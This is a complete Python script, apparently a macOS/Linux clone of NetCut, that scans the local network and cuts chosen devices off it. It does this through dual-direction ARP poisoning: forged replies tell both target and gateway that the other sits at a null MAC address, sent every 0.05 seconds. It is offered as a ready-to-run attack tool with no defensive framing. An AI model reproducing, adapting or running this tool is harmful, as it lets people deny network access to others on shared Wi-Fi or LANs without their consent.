#!/usr/bin/env python3
"""
NetCut for macOS — Dual-Direction ARP Spoofing Tool
Scan LAN → Block any device → Restore
Works on macOS & Linux. Requires sudo.
"""

import subprocess
import re
import sys
import time
import threading
import os
import signal

try:
    from scapy.all import ARP, Ether, sendp, srp
except ImportError:
    print("[!] scapy not installed. Install it first:")
    print("    pip3 install scapy")
    sys.exit(1)

spoofing = False
spoof_threads = []

# ─────────────────────────────────────────
# NETWORK TOOLS
# ─────────────────────────────────────────

def get_default_gateway():
    """Get default gateway IP from routing table (macOS/Linux)"""
    try:
        out = subprocess.check_output(["netstat", "-rn", "-f", "inet"], text=True)
        for line in out.splitlines():
            if "default" in line:
                parts = line.split()
                gw = parts[1]
                return gw
    except:
        pass
    # fallback: try ip route
    try:
        out = subprocess.check_output(["ip", "route"], text=True)
        m = re.search(r"default via (\d+\.\d+\.\d+\.\d+)", out)
        if m:
            return m.group(1)
    except:
        pass
    return None


def get_local_ip():
    """Get local IP of the active interface"""
    gateway = get_default_gateway()
    if not gateway:
        return None
    import socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((gateway, 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return None


def get_interface():
    """Detect active network interface (macOS: en0, Linux: eth0/wlan0)"""
    # macOS
    try:
        out = subprocess.check_output(["route", "get", "default"], text=True)
        m = re.search(r"interface:\s+(\S+)", out)
        if m:
            return m.group(1)
    except:
        pass
    # Linux fallback
    try:
        out = subprocess.check_output(["ip", "route"], text=True)
        m = re.search(r"dev\s+(\S+)", out)
        if m:
            return m.group(1)
    except:
        pass
    return "en0"


def get_own_mac(interface):
    """Get own MAC address"""
    try:
        out = subprocess.check_output(["ifconfig", interface], text=True)
        m = re.search(r"ether\s+([0-9a-fA-F:]{17})", out)
        if m:
            return m.group(1)
    except:
        pass
    return "unknown"


def get_mac_vendor(mac):
    """Lookup MAC vendor (optional, offline cache)"""
    try:
        from mac_vendor_lookup import MacLookup
        return MacLookup().lookup(mac)
    except:
        pass
    return "-"


def resolve_hostname(ip, timeout=1):
    """Resolve hostname via reverse DNS + mDNS + NetBIOS"""
    import socket

    # 1. Reverse DNS
    try:
        socket.setdefaulttimeout(timeout)
        host = socket.gethostbyaddr(ip)[0]
        if host and host != ip:
            return host
    except:
        pass

    # 2. mDNS / Bonjour (macOS: dns-sd)
    try:
        out = subprocess.check_output(
            ["dns-sd", "-Q", f"{ip}.in-addr.arpa", "PTR"],
            text=True, timeout=2
        )
        if "ANSWER" in out:
            m = re.search(r"(\S+\.local)", out)
            if m:
                return m.group(1)
    except:
        pass

    # 3. /etc/hosts & ARP cache hostname
    try:
        out = subprocess.check_output(["arp", "-a"], text=True)
        for line in out.splitlines():
            if ip in line:
                # macOS arp: "? (192.168.1.3) at da:6e:55:ee:94:6e ..."
                # or: "hostname.local (192.168.1.3) at ..."
                m = re.search(r"^(\S+)\s+\(" + re.escape(ip) + r"\)", line)
                if m and m.group(1) != "?":
                    return m.group(1)
    except:
        pass

    # 4. NetBIOS (if samba is installed)
    try:
        out = subprocess.check_output(
            ["nmblookup", "-A", ip],
            text=True, timeout=2, stderr=subprocess.DEVNULL
        )
        m = re.search(r"(\S+)\s+<00>", out)
        if m:
            return m.group(1)
    except:
        pass

    return None


def arp_scan(network, interface, timeout=1):
    """Scan network — ARP probe ×2 + ARP cache fallback"""
    print(f"\n[*] Scanning {network} via {interface}...")

    seen = {}  # mac -> device

    # Pass 1: Active ARP probe
    print("[*] Pass 1: ARP probe...")
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network),
        timeout=timeout,
        iface=interface,
        verbose=False
    )
    for _, rcv in ans:
        mac = rcv.hwsrc.upper()
        seen[mac] = {"ip": rcv.psrc, "mac": mac}

    # Pass 2: Second ARP probe (catch sleepy devices)
    print("[*] Pass 2: ARP re-probe...")
    time.sleep(1)
    ans2, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network),
        timeout=timeout,
        iface=interface,
        verbose=False
    )
    for _, rcv in ans2:
        mac = rcv.hwsrc.upper()
        if mac not in seen:
            seen[mac] = {"ip": rcv.psrc, "mac": mac}

    # Pass 3: ARP cache (devices that communicated recently)
    print("[*] Pass 3: ARP cache...")
    try:
        out = subprocess.check_output(["arp", "-a"], text=True)
        for line in out.splitlines():
            # macOS: "? (192.168.1.3) at da:6e:55:ee:94:6e on en0 ..."
            m = re.search(r"\((\d+\.\d+\.\d+\.\d+)\)\s+at\s+([0-9a-fA-F:]{17})", line)
            if m:
                ip, mac = m.group(1), m.group(2).upper()
                if mac not in seen:
                    seen[mac] = {"ip": ip, "mac": mac}
    except:
        pass

    # Filter: remove broadcast & multicast MACs
    devices = [
        d for d in seen.values()
        if d["mac"] != "FF:FF:FF:FF:FF:FF"
        and not d["mac"].startswith("01:00:5E")
    ]
    return devices


# ─────────────────────────────────────────
# ARP SPOOFING
# ─────────────────────────────────────────

def arp_block_loop(target_ip, gateway_ip, target_mac, gateway_mac, interface):
    """Dual-direction ARP poison — target & gateway simultaneously → DEAD"""
    global spoofing
    fake_mac = "00:00:00:00:00:00"

    # Packet 1: tell TARGET → "gateway is at 00:00..."
    pkt_target = Ether(dst=target_mac) / ARP(
        op=2, pdst=target_ip, hwdst=target_mac,
        psrc=gateway_ip, hwsrc=fake_mac
    )
    # Packet 2: tell GATEWAY → "target is at 00:00..."
    pkt_gateway = Ether(dst=gateway_mac) / ARP(
        op=2, pdst=gateway_ip, hwdst=gateway_mac,
        psrc=target_ip, hwsrc=fake_mac
    )
    # Packet 3: broadcast to flush ARP caches
    pkt_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
        op=2, pdst="0.0.0.0", hwdst="ff:ff:ff:ff:ff:ff",
        psrc=gateway_ip, hwsrc=fake_mac
    )

    print(f"\n  [⚡] {target_ip} ({target_mac}) — BLOCKED")

    count = 0
    while spoofing:
        try:
            sendp(pkt_target, verbose=False, iface=interface)
            sendp(pkt_gateway, verbose=False, iface=interface)
            count += 1
            if count % 20 == 0:
                sendp(pkt_broadcast, verbose=False, iface=interface)
            time.sleep(0.05)
        except Exception as e:
            print(f"  Error [{target_ip}]: {e}")
            break


def restore_device(target_ip, gateway_ip, target_mac, gateway_mac, interface):
    """Send correct ARP replies to restore connection"""
    packet = Ether(dst=target_mac) / ARP(
        op=2, pdst=target_ip, hwdst=target_mac,
        psrc=gateway_ip, hwsrc=gateway_mac
    )
    print(f"\n[✓] Restoring {target_ip}...")
    for _ in range(5):
        sendp(packet, verbose=False, iface=interface)
        time.sleep(0.2)
    print("[✓] Done — connection should be back to normal.")


# ─────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────

def signal_handler(sig, frame):
    global spoofing
    spoofing = False
    print("\n\n[!] Stopping...")
    sys.exit(0)


def main():
    global spoofing, spoof_threads

    # Check root
    if os.geteuid() != 0:
        print("[!] MUST run with sudo:")
        print(f"    sudo python3 {sys.argv[0]}")
        sys.exit(1)

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    # Network info
    interface = get_interface()
    gateway = get_default_gateway()
    local_ip = get_local_ip()
    own_mac = get_own_mac(interface)
    gateway_mac = None

    print("=" * 55)
    print("  🔌 NetCut for macOS")
    print("=" * 55)
    print(f"  Interface : {interface}")
    print(f"  Gateway   : {gateway}")
    print(f"  My IP     : {local_ip}")
    print(f"  My MAC    : {own_mac}")
    print("=" * 55)

    if not gateway:
        print("[!] Cannot detect gateway. Check your internet connection.")
        sys.exit(1)

    # Derive network range
    parts = gateway.split(".")
    network = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"

    # Scan
    devices = arp_scan(network, interface)

    # Find gateway MAC
    for d in devices:
        if d["ip"] == gateway:
            gateway_mac = d["mac"]

    # Display devices (with hostname)
    print(f"\n{'#':<4} {'IP':<16} {'Name':<22} {'MAC':<20} {'Type':<8}")
    print("-" * 75)
    for i, d in enumerate(devices, 1):
        # Resolve hostname
        hostname = resolve_hostname(d["ip"])
        if hostname:
            name = hostname[:20]
        else:
            # Fallback: try MAC vendor
            vendor = get_mac_vendor(d["mac"])
            name = vendor[:20] if vendor and vendor != "-" else "Unknown"

        dtype = "Gateway" if d["ip"] == gateway else ("YOU" if d["ip"] == local_ip else "User")
        marker = " ←" if d["ip"] == local_ip else ""
        print(f"{i:<4} {d['ip']:<16} {name:<22} {d['mac']:<20} {dtype:<8}{marker}")

    print(f"\n[✓] Found {len(devices)} device(s)")

    # Select target(s)
    print("\n" + "-" * 55)
    while True:
        try:
            choice = input("Select device number(s) to BLOCK (comma-separated, 0=cancel): ").strip()
            if choice == "0":
                print("Cancelled.")
                return
            # Parse: "2,4" or "2 4" or "2, 4"
            nums = [int(x.strip()) for x in choice.replace(",", " ").split()]
            if not nums:
                print("  Invalid input!")
                continue
            targets = []
            invalid = False
            for n in nums:
                idx = n - 1
                if 0 <= idx < len(devices):
                    targets.append(devices[idx])
                else:
                    print(f"  Device #{n} not found!")
                    invalid = True
            if invalid:
                continue
            break
        except (ValueError, KeyboardInterrupt):
            print("\nCancelled.")
            return

    # Validate targets
    for t in targets:
        if t["ip"] == gateway:
            print(f"[!] Skipping {t['ip']} — that's the gateway!")
            targets = [t for t in targets if t["ip"] != gateway]
        if t["ip"] == local_ip:
            print(f"[!] Skipping {t['ip']} — that's YOU, idiot!")
            targets = [t for t in targets if t["ip"] != local_ip]

    if not targets:
        print("No valid targets left.")
        return

    # Show summary
    print(f"\n{'═' * 55}")
    print(f"  🎯 BLOCKING {len(targets)} device(s):")
    print(f"{'═' * 55}")
    for t in targets:
        vendor = get_mac_vendor(t["mac"])
        hostname = resolve_hostname(t["ip"])
        name_str = f" | {hostname}" if hostname else ""
        print(f"  {t['ip']} | {t['mac']} | {vendor}{name_str}")
    print(f"{'═' * 55}")

    confirm = input(f"BLOCK {len(targets)} device(s)? (y/n): ").strip().lower()
    if confirm != "y":
        print("Cancelled.")
        return

    # Block all targets simultaneously
    spoofing = True
    print("\n[⚡] DUAL DIRECTION ARP POISON — 0.05s interval")
    print("[⚡]   → Each target: gateway = DEAD")
    print("[⚡]   → Gateway: each target = DEAD")
    print("[!] Press ENTER to stop.\n")

    spoof_threads.clear()
    for t in targets:
        t_thread = threading.Thread(
            target=arp_block_loop,
            args=(t["ip"], gateway, t["mac"], gateway_mac, interface),
            daemon=True
        )
        t_thread.start()
        spoof_threads.append(t_thread)

    # Wait for user to stop
    try:
        input()
    except KeyboardInterrupt:
        pass

    spoofing = False
    for t_thread in spoof_threads:
        t_thread.join(timeout=2)

    # Restore all
    print(f"\n[✓] Restoring {len(targets)} device(s)...")
    if gateway_mac:
        for t in targets:
            restore_device(t["ip"], gateway, t["mac"], gateway_mac, interface)
    else:
        print("[!] Cannot find gateway MAC. Restart router if targets still have no internet.")


if __name__ == "__main__":
    main()
